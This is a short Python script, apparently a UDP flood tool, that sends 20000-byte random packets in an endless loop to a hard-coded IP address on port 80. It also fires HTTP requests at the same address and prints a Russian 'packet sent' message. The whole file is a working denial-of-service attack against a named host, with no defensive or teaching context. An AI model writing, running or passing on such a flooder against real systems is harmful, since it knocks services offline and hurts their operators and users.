import socket
import random
import requests

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(20000)
def flood():
    while True:
        client.sendto(bytes, ("149.202.75.212", 80))
        response = requests.get(f"http://149.202.75.212").text
        print(response)
        print("отправлен пакет")


flood()